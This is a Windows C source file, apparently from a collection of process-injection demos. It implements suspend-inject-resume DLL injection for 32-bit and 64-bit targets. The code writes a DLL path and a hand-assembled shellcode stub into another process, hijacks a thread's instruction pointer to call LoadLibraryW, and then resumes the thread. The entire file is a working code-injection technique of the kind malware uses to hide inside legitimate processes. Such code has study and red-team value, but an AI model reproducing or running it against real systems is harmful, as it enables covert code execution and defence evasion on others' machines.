#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>
#include "fheaders.h"
#include "auxiliary.h"

#ifndef _WIN64

unsigned char sc[] =
{
	0x68, 0xef, 0xbe, 0xad, 0xde,	// push 0xDEADBEEF
	0x9c,							// pushfd
	0x60,							// pushad
	0x68, 0xef, 0xbe, 0xad, 0xde,	//push 0xDEADBEEF
	0xb8, 0xef, 0xbe, 0xad, 0xde,	// mov eax, 0xDEADBEEF
	0xff, 0xd0,						// call eax
	0x61,							// popad
	0x9d,							//popfd
	0xc3							//ret
};

DWORD demoSuspendInjectResume(PCWSTR pszLibFile, DWORD dwProcessId)
{
	void *stub;
	unsigned long threadID, oldIP, oldprot;
	HANDLE hThread;
	CONTEXT ctx;

	DWORD stubLen = sizeof(sc);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		wprintf(L"[-] Error: Could not open process for PID (%d).\n", dwProcessId);
		return(1);
	}
	DWORD LoadLibraryAddress = (DWORD)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		wprintf(L"[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n");
		exit(1);
	}

	SIZE_T dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);

	LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
	if (lpDllAddr == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory inside PID (%d).\n", dwProcessId);
		exit(1);
	}

	stub = VirtualAllocEx(hProcess, NULL, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (stub == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory for stub.\n");
		exit(1);
	}

	BOOL bStatus = WriteProcessMemory(hProcess, lpDllAddr, pszLibFile, dwSize, NULL);
	if (bStatus == 0)
	{
		wprintf(L"[-] Error: Could not write any bytes into the PID (%d) address space.\n", dwProcessId);
		return(1);
	}

	threadID = getThreadID(dwProcessId);
	hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), false, threadID);
	if (hThread != NULL)
	{
		SuspendThread(hThread);
	}
	else
		printf("could not open thread\n");

	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &ctx);
	oldIP = ctx.Eip;
	ctx.Eip = (DWORD)stub;
	ctx.ContextFlags = CONTEXT_CONTROL;

	VirtualProtect(sc, stubLen, PAGE_EXECUTE_READWRITE, &oldprot);
	memcpy((void *)((unsigned long)sc + 1), &oldIP, 4);
	memcpy((void *)((unsigned long)sc + 8), &lpDllAddr, 4);
	memcpy((void *)((unsigned long)sc + 13), &LoadLibraryAddress, 4);

	WriteProcessMemory(hProcess, stub, sc, stubLen, NULL);
	SetThreadContext(hThread, &ctx);

	ResumeThread(hThread);

	Sleep(8000);

	VirtualFreeEx(hProcess, lpDllAddr, dwSize, MEM_DECOMMIT);
	VirtualFreeEx(hProcess, stub, stubLen, MEM_DECOMMIT);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return(0);
}
#else

unsigned char sc[] = {
	0x50, // push rax (save rax)
	0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (place holder for return address)
	0x9c,                                                                   // pushfq
	0x51,                                                                   // push rcx
	0x52,                                                                   // push rdx
	0x53,                                                                   // push rbx
	0x55,                                                                   // push rbp
	0x56,                                                                   // push rsi
	0x57,                                                                   // push rdi
	0x41, 0x50,                                                             // push r8
	0x41, 0x51,                                                             // push r9
	0x41, 0x52,                                                             // push r10
	0x41, 0x53,                                                             // push r11
	0x41, 0x54,                                                             // push r12
	0x41, 0x55,                                                             // push r13
	0x41, 0x56,                                                             // push r14
	0x41, 0x57,                                                             // push r15
	0x68, 0xef,0xbe,0xad,0xde,
	0x48, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rcx, 0CCCCCCCCCCCCCCCCh (place holder for DLL path name)
	0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (place holder for LoadLibrary)
	0xFF, 0xD0,                // call rax (call LoadLibrary)
	0x58, // pop dummy
	0x41, 0x5F,                                                             // pop r15
	0x41, 0x5E,                                                             // pop r14
	0x41, 0x5D,                                                             // pop r13
	0x41, 0x5C,                                                             // pop r12
	0x41, 0x5B,                                                             // pop r11
	0x41, 0x5A,                                                             // pop r10
	0x41, 0x59,                                                             // pop r9
	0x41, 0x58,                                                             // pop r8
	0x5F,                                                                   // pop rdi
	0x5E,                                                                   // pop rsi
	0x5D,                                                                   // pop rbp
	0x5B,                                                                   // pop rbx
	0x5A,                                                                   // pop rdx
	0x59,                                                                   // pop rcx
	0x9D,                                                                   // popfq
	0x58,                                                                   // pop rax
	0xC3                                                                    // ret
};

DWORD demoSuspendInjectResume64(PCWSTR pszLibFile, DWORD dwProcessId)
{
	void *stub;
	unsigned long threadID, oldprot;
	HANDLE hThread;
	CONTEXT ctx;

	DWORD64 stubLen = sizeof(sc);
	wprintf(TEXT("[+] Shellcode Length is: %d\n"), stubLen);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		wprintf(L"[-] Error: Could not open process for PID (%d).\n", dwProcessId);
		return(1);
	}

	DWORD64 LoadLibraryAddress = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		wprintf(L"[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n");
		exit(1);
	}

	SIZE_T dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);

	LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpDllAddr == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory inside PID (%d).\n", dwProcessId);
		exit(1);
	}

	stub = VirtualAllocEx(hProcess, NULL, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (stub == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory for stub.\n");
		exit(1);
	}

	SIZE_T nBytesWritten = 0;
	BOOL bStatus = WriteProcessMemory(hProcess, lpDllAddr, pszLibFile, dwSize, &nBytesWritten);
	if (bStatus == 0)
	{
		wprintf(L"[-] Error: Could not write any bytes into the PID (%d) address space.\n", dwProcessId);
		return(1);
	}
	if (nBytesWritten != dwSize)
		wprintf(TEXT("[-] Something is wrong!\n"));

	threadID = getThreadID(dwProcessId);
	hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), false, threadID);
	if (hThread != NULL)
	{
		SuspendThread(hThread);
	}
	else
		wprintf(L"[-] Could not open thread\n");

	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &ctx);

	DWORD64 oldIP = ctx.Rip;
	ctx.Rip = (DWORD64)stub;
	ctx.ContextFlags = CONTEXT_CONTROL;

	memcpy(sc + 3, &oldIP, sizeof(oldIP));
	memcpy(sc + 41, &lpDllAddr, sizeof(lpDllAddr));
	memcpy(sc + 51, &LoadLibraryAddress, sizeof(LoadLibraryAddress));

#ifdef _DEBUG
	wprintf(TEXT("[+] Shellcode Launcher Code:\n\t"));
	for (int i = 0; i < stubLen; i++)
		wprintf(TEXT("%02x "), sc[i]);
	wprintf(TEXT("\n"));
#endif

	WriteProcessMemory(hProcess, (void *)stub, &sc, stubLen, NULL);

	SetThreadContext(hThread, &ctx);
	ResumeThread(hThread);

	Sleep(8000);

	VirtualFreeEx(hProcess, lpDllAddr, dwSize, MEM_DECOMMIT);
	VirtualFreeEx(hProcess, stub, stubLen, MEM_DECOMMIT);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return(0);
}

#endif
